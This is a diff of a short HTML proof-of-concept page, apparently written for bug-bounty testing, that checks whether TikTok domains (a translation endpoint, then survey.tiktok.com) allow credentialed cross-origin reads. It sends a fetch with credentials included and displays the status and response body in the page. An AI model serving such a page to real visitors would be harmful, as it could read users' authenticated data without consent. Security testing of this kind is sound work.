@@ -1,21 +1,24 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>Testing CORS</h1>
-<pre id="out"></pre>
+<h2>CORS Test PoC</h2>
 
 <script>
-const target = "https://starling-ttp2.tiktokv.eu/check_and_get_text/2e1fcc60aeaa11e99ef35aeebd27c9b/normal/account_server?lang=it-IT,zh&version=1761877968204741000";
-
-fetch(target, {
-  credentials: "include"
+fetch("https://survey.tiktok.com", {
+    method: "GET",
+    credentials: "include"
 })
-.then(r => r.text())
-.then(t => {
-  document.getElementById("out").innerText = t;
+.then(response => {
+    document.body.innerHTML += "<p>Status: " + response.status + "</p>";
+    return response.text();
+})
+.then(text => {
+    const pre = document.createElement('pre');
+    pre.textContent = text;
+    document.body.appendChild(pre);
 })
 .catch(err => {
-  document.getElementById("out").innerText = err.toString();
+    document.body.innerHTML += "<p style='color:red'>Errore: " + err + "</p>";
 });
 </script>
 
